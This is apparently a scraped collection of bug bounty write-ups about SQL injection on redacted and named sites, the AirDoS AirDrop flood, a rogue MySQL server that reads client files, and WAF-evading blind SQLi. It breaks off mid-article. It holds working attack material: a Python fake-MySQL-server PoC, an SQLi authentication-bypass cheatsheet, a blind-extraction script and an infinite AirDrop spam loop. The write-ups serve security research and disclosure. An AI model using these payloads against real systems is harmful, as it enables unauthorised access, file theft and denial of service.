.com/aom?utm_source=Frontpage&utm_medium=banner%20popup&utm_campaign=Frontpage%20popup%20June17%20AOM in mozilla firefox broswer. Click on the “ FOLLOW “ and capture the requests in Burpsuite. Now you will get many request followed by host : https:// redacted .com , wait for the right endpoint. I found an endpoint like this: GET /rest/aom/index?id=3 HTTP/1.1 Host: www. redacted .com User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br X-Requested-With: XMLHttpRequest Referer: https://www. redacted .com/aom?utm_source=Frontpage%22%3E%3Cscript%20%3Ealert(document.cookie)%3C/script%3E&utm_medium=banner%20popup%22%3E%3Cscript%20%3Ealert(document.cookie)%3C/script%3E&utm_campaign=Frontpage%20popup%20June17%20AOM%22%3E%3Cscript%20%3Ealert(document.cookie)%3C/script%3E Cookie: __utma=155410345.398014507.1478469081.1478469081.1478724130.2; _ga=GA1.2.398014507.1478469081; aom_popup=1; thumbnail_size=large; __stripe_mid=414d123e-85b7–4737-a479–7693beba627c; _gid=GA1.2.1421519450.1497256887; PHPSESSID=3celt75q8oh51e2jjkdl86iihjo7t3bcrh0lilfauq7odi5behjavnd8i3hsrog6ek1lb437uvu6pv3c8qd2jalt0l1jkjekl93a8f1; language=en; heartbeat=1497297643; _gat=1 Connection: close 5. The very basic check for confirming if a site is vulnerable to SQL Injection is by keeping : ‘ after id value. That is exactly what i did. 6. Now, Server response is like this : {“message”:”SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’) LIMIT 1' at line 1, query was: SELECT aom_campaign .* FROM aom_campaign WHERE (id=3') LIMIT 1\"} 7. I have confirmed that this is not browser or device specific and proceeded with submission. They awarded me a bounty of $50 and 15 points and HOF. yeah i do think $50 was low for a SQL injection but knowing the fact that the minimum bounty of this program is only 10$, I was okay with it. BTW I found another sql injection on the same day in another endpoint which awarded me the same amount. Report Time Line : Submitted report on Hackerone — Jun 13th (2 years ago) Redacted commented — Jun 13th ( 2 years ago ) Report Triaged — Jun 13th ( 2 years ago ) Added more info–Jun 15th ( 2 years ago ) Status changed to Resolved — Jun 16th ( 2 years ago ) Awarded 15 points and $50 — Jun 19th ( 2 years ago ) Thanks for reading!! Tech Sql Injection Hackerone Bug Bounty -- -- 2 Written by Sunil Yedla 893 followers · 19 following Bug bounty hunter | QA analyst | Security Researcher Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://kishanbagaria.com/airdos/", "title": "AirDoS: Remotely render any nearby iPhone or iPad unusable", "friendly_explanation": "This is a bug bounty writeup from https://kishanbagaria.com/airdos/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAirDoS: Remotely render any nearby iPhone or iPad unusable AirDoS: Remotely render any nearby iPhone or iPad unusable What if you could walk into a room and make every* iPhone or iPad unusable while you're there? Wait, that sounds evil. What if you could get that one annoying person off their iPhone who's always on it? I discovered a denial-of-service bug in iOS that I'm calling AirDoS which lets an attacker infinitely spam all nearby iOS devices with the AirDrop share popup. This share popup blocks the UI so the device owner won't be able to do anything on the device except Accept/Decline the popup, which will keep reappearing. It will persist even after locking/unlocking the device. *This bug is still subject to the AirDrop receiving setting, meaning if your AirDrop setting is set to \"Everyone\", anyone can be the attacker, but if it's set to \"Contacts Only\", only someone in your contacts can be the attacker. How would you stop this if someone were to use this attack on you? Simply run away! It'll get you out of range from the attacking device. Okay, I'm not sure how well this'd work in an airplane. Besides getting away from the attacker, who is also unidentifiable most of the time, you can stop this by turning off AirDrop/WiFi/Bluetooth. This can be done if you can access Control Center from the lock screen but not if you have it disabled. Either way, you can ask Siri to turn off WiFi or Bluetooth. Restarting your device may also give you some time to turn AirDrop off before the attack takes place again. To prevent this attack from taking place at all, turn on AirDrop only when you need it and don't ever keep it set to \"Everyone\". I reported this bug to Apple in August 2019. It's been fixed in iOS 13.3 with a rate limit (after declining the same device 3 times, iOS will automatically decline any subsequent requests). I've posted my PoC exploit on GitHub . It supports multiple devices but deliberately doesn't support devices that have their AirDrop receiving setting set to \"Contacts Only\" to reduce the impact of publicly posting the exploit. Huge thanks to Milan Stute and Alexander Heinrich, for authoring opendrop which powers the exploit and which originally inspired me to try this out (literally found it after five minutes of playing with opendrop). This is a simple bug and can also be exploited for a single device with a simple infinite loop and opendrop: while true ; do opendrop send -r 0 -f totally-random-file ; done macOS macOS shows the AirDrop share popup differently than iOS and doesn't block the UI. An attacker could still send a lot of share requests to spam someone but since the UI is non-blocking, they can easily turn off AirDrop or WiFi/Bluetooth. Here's a video of how it looks like on macOS. A fix for this has been implemented in macOS Catalina 10.15.2, Security Update 2019-002 Mojave and Security Update 2019-007 High Sierra. Timeline 2019-08-19 : Report sent to Apple 2019-10-03 : Asked for status update 2019-10-03 : Apple replied: \"We are still investigating this issue. If we determine that our products are affected, then we may prepare a security update for our customers.\" 2019-11-14 : Apple emailed: \"We will be addressing the issue you reported with a mitigation in an upcoming security update and would appreciate your assessment of whether our latest beta of iOS 13.3 addresses the issue. […] While it will not receive a CVE, we want to publicly acknowledge your assistance in our security advisory.\" 2019-11-15 : I replied confirming bug is fixed in iOS 13.3 public beta 2 and asked when can I publicly disclose 2019-11-15 : Apple replied: \"We would appreciate it if you can withhold public discussion of this issue until the security update is released to our customers. The security update is currently planned for mid-December 2019.\" 2019-12-10 : iOS 13.3 released, security advisories published and publicly disclosed © 2010-2025 Kishan Bagaria Twitter · Email · Keybase 🌃 🌇"}
{"source_url": "https://www.vesiluoma.com/abusing-mysql-clients/", "title": "Abusing MySQL clients to get LFI from the server/client – vesiluoma.com", "friendly_explanation": "This is a bug bounty writeup from https://www.vesiluoma.com/abusing-mysql-clients/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAbusing MySQL clients to get LFI from the server/client – vesiluoma.com Hacking, photography, computers, tech. vesiluoma.com Main Hacking One Breach to Crack ‘Em All! Insights from Password Breaches Offensive Security Certified Professional (OSCP): After the 60 day ordeal Offensive Security Certified Expert (OSCE) – No pain, no gain! Offensive Security Web Expert (OSWE) – Advanced Web Attacks and Exploitation TP-Link TL-SC3171G IP-camera r00t Wifi Pineapple module scanner Exploiting badUSB/Digispark + meterpreter payload Evading Antivirus softwares Attacking locked computers with Poisontap Backdooring TP-Link WR841ND WiFi router Cracking WPA2 password Abusing MySQL clients to get LFI from the server/client Photography Projects Unofficial Anvia Watson XBMC plugin Kenko Extension tube + Canon 18-55mm kit lense Nokia N900 web control interface How to install Nokia N900 web interface How to install OpenWRT to TP-Link WR841ND Contact Abusing MySQL clients to get LFI from the server/client Thinking to expose your service that fetches content from some user given MySQL server? Think again. You may expose the client to LFI vulnerability via MySQL client feature . Recently I found a public webpage that was used to connect to a remote MySQL database, from a bug bounty program. User was able to input server address, username, password in the webpage and do some (restricted) administrative things like issue some predefined SQL queries. The page was always connecting to a MySQL port (3306/TCP) and the web UI was pretty limited and well done, so nothing really exploitable there, unfortunately. I setup my own test server with MySQL service running and tried to connect to it, but nothing fancy there either. Output from the database was pretty well sanitised and pretty much only thing that would have been possible was XSS that would have needed a lot of steps to perform. Must Try Harder. Since the MySQL server always first sends a banner to the connecting client, I decided to do some digging if that would at least cause an XSS that would require less steps to perform. For fun and giggles, I decided to write a fake MySQL server that would do the authentication etc. steps needed for the client to connect and would serve some malicious content automatically to the server. I never got there. While researching the subject, I found that the MySQL client has a nice, well documented, feature “LOAD DATA” and with “LOAD DATA INFILE” the client actually loads a file from the CLIENT machine and sends it to the server, weird. And Awesome. And weird, really weird. It is very strange how this kind of feature that is so easily exploitable, is still open. Some more research (=google for teh win) revealed that this has been exploited before, (articles dating back all the way to 2013!) and there is some good writeups of this already (links at the end of this post). But I wanted to do this myself, so… I launched a wireshark and recorded the client – server login traffic from a real use case so I could check the data between the client and server. Checking this was pretty easy, since the clients and server traffic is easily readable ASCII. The image above is from the traffic when user logs in to the MySQL server and selects database. As we can see from the image below, the traffic is pretty easily readable. From the packet #29 “ Login request user=teamrot ” (image below) we can also see that our client supports “ LOAD DATA LOCAL ”. If this is not set, this won’t work. We could also use the following SQL query from the website itself: LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE disobey.test FIELDS TERMINATED BY \"\\n\" From here on out, it was pretty much parsing the correct stuff from the .pcap and send them to the client in following order: Greeting Auth Ok Payload This was the fun part. No matter what the client sends to the server, we just send back “Auth OK” packet and the client thinks it is authorised. After authorisation packet, the payload is send. Now the client thinks it is authenticated and does what the server tells it to do. Yay(?). Actually, this was also the scary part, malicious attacker could just setup a fake MySQL server and trick clients to connect to it and vóila, attacker gets files, uhh…Anyway, moving on… Here is corrects parts parsed from the .pcap. #1 Auth OK 0000 b0 35 9f 44 95 a3 08 00 27 19 f2 99 08 00 45 00 °5.D.£..'.ò...E. 0010 00 3f f9 5e 40 00 40 06 2c c0 0a 00 00 3d 0a 00 .?ù^@.@.,À...=.. 0020 00 5e 0c ea ce 64 05 79 a6 55 f5 b2 1e 7b 80 18 .^.êÎd.y¦Uõ².{.. 0030 00 eb fd 46 00 00 01 01 08 0a 00 b2 5c ab 1a 89 .ëýF.......²\\«.. 0040 49 a8 07 00 00 02 00 00 00 02 00 00 00 I¨........... #2. Server greeting: 0000 b0 35 9f 44 95 a3 08 00 27 19 f2 99 08 00 45 00 °5.D.£..'.ò...E. 0010 00 93 f9 5c 40 00 40 06 2c 6e 0a 00 00 3d 0a 00 ..ù\\@.@.,n...=.. 0020 00 5e 0c ea ce 64 05 79 a5 f6 f5 b2 1d d2 80 18 .^.êÎd.y¥öõ².Ò.. 0030 00 e3 e6 34 00 00 01 01 08 0a 00 b2 5c aa 1a 89 .ãæ4.......²\\ª.. 0040 49 a5 5b 00 00 00 0a 35 2e 36 2e 32 38 2d 30 75 I¥[....5.6.28-0u 0050 62 75 6e 74 75 30 2e 31 34 2e 30 34 2e 31 00 2d buntu0.14.04.1.- 0060 00 00 00 40 3f 59 26 4b 2b 34 60 00 ff f7 08 02 ...@?Y&K+4`.ÿ÷.. 0070 00 7f 80 15 00 00 00 00 00 00 00 00 00 00 68 69 ..............hi 0080 59 5f 52 5f 63 55 60 64 53 52 00 6d 79 73 71 6c Y_R_cU`dSR.mysql 0090 5f 6e 61 74 69 76 65 5f 70 61 73 73 77 6f 72 64 _native_password 00a0 00 #3. Request file (/etc/hosts) 0000 b0 35 9f 44 95 a3 08 00 27 19 f2 99 08 00 45 00 °5.D.£..'.ò...E. 0010 00 43 f9 5f 40 00 40 06 2c bb 0a 00 00 3d 0a 00 .Cù_@.@.,»...=.. 0020 00 5e 0c ea ce 64 05 79 a6 60 f5 b2 1e a0 80 18 .^.êÎd.y¦`õ². .. 0030 00 eb e6 5c 00 00 01 01 08 0a 00 b2 5c ab 1a 89 .ëæ\\.......²\\«.. 0040 49 a9 0b 00 00 01 fb 2f 65 74 63 2f 68 6f 73 74 I©....û/etc/host 0050 73 To exploit this easily, I made a small (+crude+awful+quick) python script that does exactly what I wanted. This is just a poc, so no fancy features like detection of client OS, type, fetching of different files etc. that could be done. #!/usr/bin/python #coding: utf8 import socket # linux : filestring = \"/etc/hosts\" # windows: #filestring = \"C:\\\\Windows\\\\system32\\\\drivers\\\\etc\\\\hosts\" HOST = \"0.0.0.0\" # open for eeeeveryone! ^_^ PORT = 3306 BUFFER_SIZE = 1024 #1 Greeting greeting = \"\\x5b\\x00\\x00\\x00\\x0a\\x35\\x2e\\x36\\x2e\\x32\\x38\\x2d\\x30\\x75\\x62\\x75\\x6e\\x74\\x75\\x30\\x2e\\x31\\x34\\x2e\\x30\\x34\\x2e\\x31\\x00\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00\" #2 Accept all authentications authok = \"\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00\" #3 Payload payloadlen = \"\\x0b\" padding = \"\\x00\\x00\" payload = payloadlen + padding + \"\\x0b\\x00\\x00\\x01\\xfb\\x2f\\x65\\x74\\x63\\x2f\\x68\\x6f\\x73\\x74\\x73\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.bind((HOST, PORT)) s.listen(1) while True: conn, addr = s.accept() print 'Connection from:', addr conn.send(greeting) while True: data = conn.recv(BUFFER_SIZE) print \" \".join(\"%02x\" % ord(i) for i in data) conn.send(authok) data = conn.recv(BUFFER_SIZE) conn.send(payload) print \"[*] Payload send!\" data = conn.recv(BUFFER_SIZE) if not data: break print \"Data received:\", data break # Don't leave the connection open. conn.close() Aaand a small video about exploiting this. It’s weird how this kind of “feature” is still so open. This could be easily used to steal files from the victim, use as a LFI to steal files from the server etc. The “LOAD DATA LOCAL” – feature is enabled by default (usually), so you may want to check if you can disable the feature. This of course means that if you let users to set another MySQL server and/or connect from your computer to some MySQL server, there may be attacker that will be able to read your files… Tested with: PHP 7.0.32-0ubuntu0.16.04.1 (cli) ( NTS ) mysql Ver 8.0.13 for osx10.14 on x86_64 (Homebrew) mysql Ver 14.14 Distrib 5.7.24, for Linux (x86_64) Links to source materials: https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f https://dev.mysql.com/doc/refman/5.7/en/load-data.html Archives Meta Log in Entries feed Comments feed WordPress.org Pages Abusing MySQL clients to get LFI from the server/client Development projects How to install Nokia N900 web interface How to install OpenWRT to TP-Link WR841ND Kenko Extension tube + Canon 18-55mm kit lense Nokia N900 web control interface Unofficial Anvia Watson XBMC plugin Exploiting badUSB/Digispark + meterpreter payload Hacking Attacking locked computers with Poisontap Backdooring TP-Link WR841ND WiFi router Cracking WPA2 password Evading Antivirus softwares Offensive Security Certified Expert (OSCE) – No pain, no gain! Offensive Security Certified Professional (OSCP): After the 60 day ordeal One Breach to Crack ‘Em All! Insights from Password Breaches TP-Link TL-SC3171G IP-camera r00t Wifi Pineapple module scanner Main Offensive Security Web Expert (OSWE) – Advanced Web Attacks and Exploitation Biography Gallery Videos Contact Archives Categories No categories WordPress Log in WordPress CyberChimps WordPress Themes © vesiluoma.com vesiluoma.com | Abusing MySQL clients to get LFI from the server/clientvesiluoma.com | Abusing MySQL clients to get LFI from the server/clientvesiluoma.com | Abusing MySQL clients to get LFI from the server/client"}
{"source_url": "https://blog.securitybreached.org/2018/09/09/zol-zimbabwe-authbypass-sqli-xss/", "title": "ZOL Zimbabwe Authentication Bypass to XSS & SQLi Vulnerability - Bug Bounty POC - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2018/09/09/zol-zimbabwe-authbypass-sqli-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nZOL Zimbabwe Authentication Bypass to XSS & SQLi Vulnerability - Bug Bounty POC - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty September 9, 2018 Share BugBounty POC 1 ZOL Zimbabwe Authentication Bypass to XSS & SQLi Vulnerability – Bug Bounty POC by MuhammadKhizerJaved Hey Guys! Me Back with a New Post This One is about an Authentication Bypass Vulnerability in one of the subdomains of https://zol.co.zw/ ZOL Zimbabwe and Then got an XSS following with an SQLi in that Control Panel. So The Main Focus of this Blog Post will be on How i got access to the CP and then How i Got the XSS Following the SQLi So fast Forward I got a Subdomain of the site that was http://psizimll2.zol.co.zw/ and the Subdomain was Showing the Default IIS7 Page Like in the Picture Below So At First I started testing this Subdomain for 2 Of the Most Common issues Found in IIS7 1) Microsoft IIS Tilde Vulnerability (And the Site was Vulnerable to this issue) 2) HTTP.sys DOS & possible RCE but after testing these Common Issues on the subdomain i got nothing and decided to dig deeper. So i searched the subdomain on Google to see if there is any information about this particular subdomain (Most of the time a simple google search gives you some files or folders ) But negative i got nothing i did go through virustotal & Some other webs like web archive to get some information but nothing. After this the next phase of my testing was to use DirBuster & DirScanner to test Further for any possible Files/Folders and after a while i got Some URLs Like http://psizimll2.zol.co.zw/test.php http://psizimll2.zol.co.zw/info.php http://psizimll2.zol.co.zw/cp.php The 2 Pages test.php and info.php were both leaking Some Information Through phpinfo(); Pages So At this Point i had 2 Issues in that Subdomain…. Now When Ever I went to the URL http://psizimll2.zol.co.zw/cp.php i got redirected to the main page of the subdomain that was http://psizimll2.zol.co.zw/ So as Many of you guys know about some redirect based techniques, Like This NoRedirect one i added the URL cp.php to the FireFox Extension called NoRedirect and Then When i went to the URL http://psizimll2.zol.co.zw/cp.php it did;t redirected me to http://psizimll2.zol.co.zw/ and i had Access to http://psizimll2.zol.co.zw/cp.php that looked like a Control Panel for some sort of webapp that have some users data in it. Now I searched for Some Data and it was a User Information Database of some sort while searching In It I got another Page that was http://psizimll2.zol.co.zw/dnpc.php and this Page got data of users function where i can search user data from particular dates while searching a POST request was send to the file /dnpc.php with post data as Submit2=Go&end_dt1&start_dt=10 And I saw that the anything that we add to the perimeters end_dt or start_dt was reflecting back in the page under a <th></th> tag so i added a simple Image XSS Payload and it was reflected to me under the <th></th> tag and the XSS payload was executed And I would Like to Mention That due to some error the Search Input was Saved on this Page so It became a Stored XSS 🤣 Now It was getting Bored So i Decided to Write the Report to the team and suddenly decided to look for One last issue that can make the report look better So at the same Endpoints in the same POST request as Above i simply changed searched for 1′ Submit2=Go&end_dt1&start_dt=10 as I started looking for an SQL Injection Issue aND boom the Response for this request gave me an Error Could not get htccc data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”’ at line 1 And So I did Exploit this issue to Get the Basic Info and Tables and then i was Convinced i should Stop Further Tests on this Subdomain and Report the issue Furthermore the ZOL team Patched these Issues by Deleting files and Blocking access to the Subdomain 👏 Thanks for Reading this guys 🙂 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: Authentication Bypass SQL Injection XSS MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X One reply on “ZOL Zimbabwe Authentication Bypass to XSS & SQLi Vulnerability – Bug Bounty POC” These Bug Bounty Writeups will Change Your Life - PrimeHackers says: June 26, 2020 at 7:19 am […] Authbypass SQLi and XSS […] Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next Authentication Bypass Using SQL Injection AutoTrader Webmail – Bug Bounty POC Previous SQL Injection Vulnerability bootcamp.nutanix.com | Bug Bounty POC You may also like April 19, 2023 by MuhammadKhizerJaved How I Manipulated My Rank on the Bugcrowd Platform This vulnerability on the Bugcrowd platform allowed manipulating rank on the platform using the API. Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC / Tutorials 0 Read More June 30, 2020 by MuhammadKhizerJaved Using Inspect Element to Bypass Security restrictions | Bug Bounty POC Hey guys so this blog post is about bug bounty report, I was able to Bypass Security restrictions by using inspect element and use Paid Features. About the Issue: The... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC / Tutorials 4 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://blog.securitybreached.org/2018/09/10/sqli-login-bypass-autotraders/", "title": "Authentication Bypass Using SQL Injection AutoTrader Webmail - Bug Bounty POC - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2018/09/10/sqli-login-bypass-autotraders/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAuthentication Bypass Using SQL Injection AutoTrader Webmail - Bug Bounty POC - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty September 10, 2018 Share BugBounty POC 3 Authentication Bypass Using SQL Injection AutoTrader Webmail – Bug Bounty POC by MuhammadKhizerJaved Hey guys Me again with a Short POC about Login Bypass Using SQL Injection to get Access to AutoTraders Webmail so lets begain the POC will be short. What happened was i was working on AutoTraders Bug Bounty Program and had reported a couple of issues but all were Duplicate so i was checking subdomains when i landed on a subdomain that was https://dealeremail.autotrader.co.uk/ and this subdomain had a Login page So i Tried Multiple login using different Usernames and Passwords But none of them worked so Following the testing for SQLi I entered a 1” in Username Field and an Error Occurred that was something like SELECT * FROM adm WHERE the Error was Long and had the SQL Query that the login page function was using So Next Phase i used the Most Common Injection String in Username and Password fields and BOOM 💥 I was into the Admin Panel The String I used was admin’–‘ for Username and same admin’–‘ For The Password That’s All for this Short POC 🙂 But I’m adding some common Strings that can be useful for you guys while testing for such issues SQLi Auth Bypass Common Cheatsheet or 1=1 or 1=1– or 1=1# or 1=1/* admin” or “1”=”1″– admin” or “1”=”1″# admin” or “1”=”1″/* admin”or 1=1 or “”=” admin” or 1=1 admin” or 1=1– admin” or 1=1# admin” or 1=1/* admin”) or (“1″=”1 admin”) or (“1″=”1”– admin”) or (“1″=”1″# admin”) or (“1″=”1″/* admin”) or “1”=”1 admin”) or “1”=”1″– admin”) or “1”=”1″# admin”) or “1”=”1″/* admin’ — admin’ # admin’/* admin’ or ‘1’=’1 admin’ or ‘1’=’1′– admin’ or ‘1’=’1’# admin’ or ‘1’=’1’/* admin’or 1=1 or ”=’ admin’ or 1=1 admin’ or 1=1– admin’ or 1=1# admin’ or 1=1/* admin’) or (‘1’=’1 admin’) or (‘1’=’1’– admin’) or (‘1’=’1’# admin’) or (‘1’=’1’/* admin’) or ‘1’=’1 admin’) or ‘1’=’1′– admin’) or ‘1’=’1’# admin’) or ‘1’=’1’/* So the End I reported the issue it was migrated urgently and all i got was This Swag Pack ( It was indeed Useful ) Thanks for Reading guys! 🙂 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: Authentication Bypass SQL Injection MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X 3 replies on “Authentication Bypass Using SQL Injection AutoTrader Webmail – Bug Bounty POC” These Bug Bounty Writeups will Change Your Life - PrimeHackers says: July 12, 2020 at 1:17 pm […] SQLI Authentication Bypass AutoTrader Webmail […] Loading... Reply pandu says: December 28, 2018 at 3:49 pm but you gave a highly sensitive information bro…they gave you just like …as u gave a suggesstion to them…….damnnnnnnnnnn Loading... Reply Mukhtar says: September 12, 2018 at 9:32 am Thanks for sharing this information. Swag pack is awesome 😊 Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next IDOR User Account Takeover By Connecting My Facebook Account with victims Account Previous ZOL Zimbabwe Authentication Bypass to XSS & SQLi Vulnerability – Bug Bounty POC You may also like September 16, 2018 by MuhammadKhizerJaved IDOR User Account Takeover By Connecting My Facebook Account with victims Account Hey Guys Its Me Khizer again So This Blog is about an IDOR issue i found in a Web where changing the User ID in Facebook auth callback linking request... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 0 Read More November 20, 2017 by MuhammadKhizerJaved UBER Wildcard Subdomain Takeover | BugBounty POC Hi All, So Last month i decided to test Uber for Fun & Profit, So while scanning for subdomains to target i found a subdomain “design.uber.com” While navigating to the... Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... BugBounty POC 10 Read More Security Breached Blog © 2025. All Rights Reserved. Powered by WordPress . Theme by Alx . Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html", "title": "SQL Injection and A silly WAF", "friendly_explanation": "This is a bug bounty writeup from https://mahmoudsec.blogspot.com/2018/07/sql-injection-and-silly-waf.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSQL Injection and A silly WAF Skip to main content Search This Blog Mahmoud Gamal - Security Blogs SQL Injection and A silly WAF Get link Facebook X Pinterest Email Other Apps July 25, 2018 Hi Folks, Today I'll be writing about some interesting SQL injection vulnerabilities I recently found. This is a private program so I won't be mentioning who the vendor is. #1: WAF? ok! At a lovely hacking night I started testing for a private bug bounty program, after about 30 minutes of throwing random single and double quotes inside all the parameters, one of the endpoints returned an error saying: {\"error\":\"An unexpected error has occured\"} So I looked at the request and set the value of the parameter to `23' and '1'='1` and as expected the endpoint returned valid results which means it's vulnerable to SQL injection! That's it, a lovely basic Boolean-Based SQL injection let's write the report and get a nice bounty! But... THE WAF! While further exploiting this vulnerability to extract data from the database as a proof of concept, the endpoint was returning {\"error\":\" undergoing corrective maintenance \"} even to normal requests without any SQLi payloads. I later realized that this is probably the WAF blocking some random requests when it suspects an IP address which explains why other researchers haven't reported this obvious SQLi before (maybe they thought it was a false-positive. I also thought that, it took me some time to understand what was going on!) So I wrote a python script that detects when the WAF blocks a request if the response contains \"undergoing corrective maintenance\" and repeats it until we get response from the server (If we get \"Error\" or \"True\" that means we are talking to the server): import requests c = {} # Cookies s = '_-@.abcdefghijklmnopqrstuvwxyz0123456789' res = '' restart = True while(restart): restart = False for i in s: if(i == '_'): i = '\\\\_' # print i p = \"23' AND (select lower(ora_database_name) from dual) like '\"+str(res)+str(i)+\"%\" # SQL Query try: r = requests.post(\"http://target/vulnerable\",data={\"serialNumber\":p}, headers=c) except requests.exceptions.Timeout as e: print \"Timed out\" while('undergoing corrective' in r.content): # Silly WAF? repeat the request print \"Repeating Request\" r = requests.post(\"http://target/vulnerable\",data={\"serialNumber\":p}, headers=c) if \"SESSION_EXPIRED\" in r.content: print \"ERROR - SESSION_EXPIRED\" break if \"true\" in r.content: ## No error, correct char res+=i print res , \"found\" restart = True break The PoC worked, I reported the vulnerability and received the bounty. I didn't stop right there, now knowing how the WAF works, I kept testing all other endpoints and found a couple more with the same technique. Ok, that probably was not that hard, let's move on to the next level. #2: Fuck you WAF! One of the endpoints (a non-json one) was also vulnerable to boolean based sql injection similar to the one above, but the WAF this time was acting differently. When my SQL query evaluated to `true` the response had a specific word, let's say `2222`, but when it evaluated to false, the application returned a static error page. The problem was that the WAF was returning the exact same response as when the query evaluated to false which means I can't differentiate between a response that was sent by the WAF and a response that was sent by the server when the query is evaluated to false as they both are exactly the same! I kept trying to bypass the WAF but no luck, it was returning the same error page for random requests even when the query evaluated to true so I wasn't able to extract anything from the database. I was about to give up when I came across an idea to write a python script that repeats 